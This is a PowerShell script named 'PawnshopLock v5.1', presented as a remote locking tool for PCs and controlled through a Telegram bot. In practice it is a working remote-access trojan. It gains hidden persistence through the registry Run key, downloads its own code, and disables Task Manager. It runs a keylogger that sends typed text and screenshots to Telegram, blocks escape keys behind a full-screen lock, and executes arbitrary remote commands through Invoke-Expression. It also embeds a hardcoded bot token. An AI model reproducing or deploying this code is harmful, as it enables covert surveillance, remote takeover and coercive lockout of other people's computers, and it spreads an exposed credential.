# ================================
# PawnshopLock v5.1 – Advanced Remote Control
# Supports: /lockPC, /unlockPC, /statusPC, /screenshotPC, /execPC <cmd>
# Auto-saves itself, persists on login, keylogger alerts, granular commands
# ================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIGURATION ---
$githubURL     = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'
$localFolder   = "$env:ProgramData\PawnshopLock"
$localFile     = "$localFolder\pawnlock.ps1"
$imageURL      = 'https://raw.githubusercontent.com/diezul/x/main/69.jpeg'
$tempImg       = "$env:TEMP\pawnlock.jpg"
$botToken      = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID        = 656189986
$pcID          = $env:COMPUTERNAME
$user          = $env:USERNAME
$lockCmd       = "/lock$pcID".ToLower()
$unlockCmd     = "/unlock$pcID".ToLower()
$statusCmd     = "/status$pcID".ToLower()
$screenshotCmd = "/screenshot$pcID".ToLower()
$execCmdPrefix = "/exec$pcID ".ToLower()

# --- PERSISTENCE (HKCU\Run) ---
if (-not (Test-Path $localFolder)) { New-Item -Path $localFolder -ItemType Directory -Force | Out-Null }
if (-not (Test-Path $localFile)) {
    try { Invoke-WebRequest $githubURL -OutFile $localFile -UseBasicParsing } catch {}
}
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
try { Set-ItemProperty -Path $regPath -Name 'PawnshopLock' -Value $regValue -Force } catch {}

# --- DOWNLOAD LOCKSCREEN IMAGE ---
try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}

# --- TELEGRAM FUNCTIONS ---
function Send-TG($msg) {
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" `
            -Method POST -ContentType 'application/json' -Body $body -TimeoutSec 10
    } catch {}
}
function Send-TGPhoto($path, $caption='') {
    try {
        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $header = "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatID$LF" +
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"caption`"$LF$LF$caption$LF" +
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"photo`"; filename=`"img.jpg`"$LF" +
            "Content-Type: image/jpeg$LF$LF"
        $footer = "$LF--$boundary--$LF"
        $fileBytes = [IO.File]::ReadAllBytes($path)
        $data = [Text.Encoding]::ASCII.GetBytes($header) + $fileBytes + [Text.Encoding]::ASCII.GetBytes($footer)
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
        $wc.UploadData("https://api.telegram.org/bot$botToken/sendPhoto","POST",$data) | Out-Null
    } catch {}
}

# --- DISABLE/ENABLE TASK MANAGER ---
function Disable-TM { 
    $p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
    if (-not (Test-Path $p)) { New-Item $p -Force | Out-Null }
    Set-ItemProperty -Path $p -Name DisableTaskMgr -Value 1 -Type DWord -Force 
}
function Enable-TM {
    $p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
    if (Test-Path $p) { Set-ItemProperty -Path $p -Name DisableTaskMgr -Value 0 -Type DWord -Force }
}

# --- SCREENSHOT ---
function Take-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [Windows.Forms.Screen]::AllScreens | Select-Object -First 1 | ForEach-Object { $_.Bounds }
    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $g = [Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
    $out = "$env:TEMP\screenshot_$([guid]::NewGuid()).jpg"
    $bmp.Save($out,[Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $bmp.Dispose()
    return $out
}

# --- KEYLOGGER ---
Add-Type @"
using System;using System.Text;using System.Runtime.InteropServices;using System.Windows.Forms;
public class KeyLogger {
    private static IntPtr h=IntPtr.Zero;
    private delegate IntPtr P(int n,IntPtr w,IntPtr l);
    private static P d=Hook;
    private const int WH=13,WM=0x0100;
    private static StringBuilder buf=new StringBuilder();
    public static event Action<string> Detected;
    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
    public static void Start(){if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
    public static void Stop(){if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
    private static IntPtr Hook(int n,IntPtr w,IntPtr l){
        if(n>=0 && w==(IntPtr)WM){
            int vk=Marshal.ReadInt32(l); char c=(char)vk; buf.Append(c);
            var t=buf.ToString().ToLower();
            if(t.Contains("porn")||t.Contains("codru")){
                Detected?.Invoke(t);
                buf.Clear();
            }
            if(buf.Length>100) buf.Remove(0,buf.Length-50);
        }
        return CallNextHookEx(h,n,w,l);
    }
}
"@
[KeyLogger]::Detected += { param($t) 
    $m="⚠ Keyword detected on $pcID: '$t'"
    Send-TG $m
    $shot=Take-Screenshot; Send-TGPhoto $shot "Screenshot for '$t'"; Remove-Item $shot -Force
}
[KeyLogger]::Start()

# --- KEYBLOCKER ---
Add-Type @"
using System;using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr h=IntPtr.Zero;private delegate IntPtr P(int n,IntPtr w,IntPtr l);private static P d=Hook;
    private const int WH=13,WM=0x0100,WS=0x0104;
    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
    public static void Block(){ if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
    public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;} }
    private static IntPtr Hook(int n,IntPtr w,IntPtr l){
        if(n>=0&&(w==(IntPtr)WM||w==(IntPtr)WS)){
            int vk=Marshal.ReadInt32(l);
            if(vk==0x43) return CallNextHookEx(h,n,w,l);
            bool alt=(GetAsyncKeyState(0x12)&0x8000)!=0;
            bool ctrl=(GetAsyncKeyState(0x11)&0x8000)!=0;
            bool shift=(GetAsyncKeyState(0x10)&0x8000)!=0;
            if((vk==0x1B&&ctrl)||(vk==0x09&&alt)||(vk==0x1B&&alt)||(vk==0x5B)||(vk==0x5C)||(vk==0x1B&&ctrl&&shift)) return (IntPtr)1;
            return (IntPtr)1;
        }
        return CallNextHookEx(h,n,w,l);
    }
    [DllImport("user32.dll")]static extern short GetAsyncKeyState(int v);
}
"@

# --- LOCK FUNCTION ---
function Lock-PC {
    Disable-TM; KeyBlocker::Block()
    Send-TG "🔒 PC $pcID locked by $user. Unlock: $unlockCmd"
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $global:forms = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle='None';WindowState='Maximized';TopMost=$true;BackColor='Black';
            Cursor=[Windows.Forms.Cursors]::None;Location=$_.Bounds.Location;Size=$_.Bounds.Size
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image=[Drawing.Image]::FromFile($tempImg);Dock='Fill';SizeMode='StretchImage'
        }
        $f.Controls.Add($pb); $f.Add_Deactivate({$f.Activate()}); $f.Show(); $f
    }
}

function Unlock-PC {
    foreach($f in $global:forms){ try{$f.Close()}catch{}}
    $global:forms = $null
    KeyBlocker::Unblock(); Enable-TM()
    Send-TG "⚠️ PC $pcID unlocked. Use $lockCmd to re-lock."
}

# --- MAIN TELEGRAM LOOP ---
$offset = 0
try { $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=5&offset=$offset" -TimeoutSec 10 } catch {}
while($true) {
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
        foreach($m in $updates.result) {
            $offset = $m.update_id + 1
            $txt = $m.message.text.ToLower()
            if($m.message.chat.id -ne [int]$chatID) { continue }
            if($txt -eq $lockCmd)      { Lock-PC }
            elseif($txt -eq $unlockCmd){ Unlock-PC }
            elseif($txt -eq $statusCmd){ 
                $st = if($global:forms) {'LOCKED'} else {'UNLOCKED'}
                Send-TG "📍 PC $pcID is $st"
            }
            elseif($txt -eq $screenshotCmd) {
                $shot=Take-Screenshot; Send-TGPhoto $shot "Screenshot from $pcID"; Remove-Item $shot -Force
            }
            elseif($txt.StartsWith($execCmdPrefix)) {
                $cmd=$txt.Substring($execCmdPrefix.Length)
                $out = try{Invoke-Expression $cmd 2>&1|Out-String}catch{$_.Exception.Message}
                Send-TG "🖥 Exec on $pcID:`n$out"
            }
        }
    } catch {}
    Start-Sleep -Seconds 3
}
